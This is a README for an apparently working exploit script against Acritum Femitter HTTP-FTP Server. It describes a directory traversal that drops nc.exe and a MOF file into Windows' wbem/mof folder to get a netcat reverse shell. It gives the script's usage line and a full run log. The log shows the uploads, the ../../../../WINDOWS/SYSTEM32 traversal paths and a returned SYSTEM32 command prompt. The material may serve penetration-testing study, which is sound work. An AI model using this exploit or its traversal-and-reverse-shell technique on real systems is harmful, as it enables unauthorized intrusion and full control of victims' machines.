# femitter_ftp_mof_dropper_rce

## Summary

Acritum Femitter HTTP-FTP Server is a HTTP and FTP server application for Windows.
Because of insufficiently sanitation of user-supplied input, Femitter FTP Server is prone to a directory traversal vulnerability.
As the Stuxnet approach we abuse this by drop a mof file to get a netcat reverse shell.

## Usage

Run femitter_ftp_mof_dropper_rce.py to get the usage menu.

```sh 
⬢  femitter_ftp_mof_dropper_rce  master ⦿ ./femitter_ftp_mof_dropper_rce.py

• ▌ ▄ ·.       ·▄▄▄·▄▄▄▄▄▄▄▄ ▄▄▄··▄▄▄▄  ▄▄▄         ▄▄▄· ▄▄▄·▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▪     ▐▄▄·▐▄▄·•██  ▐█ ▄███▪ ██ ▀▄ █·▪     ▐█ ▄█▐█ ▄█▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█· ▄█▀▄ ██▪ ██▪  ▐█.▪ ██▀·▐█· ▐█▌▐▀▀▄  ▄█▀▄  ██▀· ██▀·▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▌.▐▌██▌.██▌. ▐█▌·▐█▪·•██. ██ ▐█•█▌▐█▌.▐▌▐█▪·•▐█▪·•▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀█▄▀▪▀▀▀ ▀▀▀  ▀▀▀ .▀   ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪.▀   .▀    ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
    
Usage: ./femitter_ftp_mof_dropper_rce.py <HOST>:<PORT> <LHOST> <LPORT> <USERNAME> <PASSWORD>
EXAMPLE: ./femitter_ftp_mof_dropper_rce.py 10.10.10.59 10.10.14.24 1337 anonymous password
```

Run the exploit.

```sh
⬢  femitter_ftp_mof_dropper_rce  master ⦿ ./femitter_ftp_mof_dropper_rce.py 10.11.1.xxx 10.11.0.xxx 4444 admin password
[+] LHOST = 10.11.0.xxx
[+] Generating xIVohfjZ.mof
[+] Netcat = 4444
[-] Could not upload file: nc.exe
[+] Uploaded: nc.exe into Upload
[-] Could not upload file: nc.exe
[+] Uploaded: nc.exe into Upload
[-] Could not upload file: xIVohfjZ.mof
[+] Uploaded: xIVohfjZ.mof into Upload
[+] traversal sys32=../../../../WINDOWS/SYSTEM32
[+] traversal wbem=../../../../WINDOWS/SYSTEM32/wbem/mof
Connection from 10.11.1.xxx:1043
Microsoft Windows XP [version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```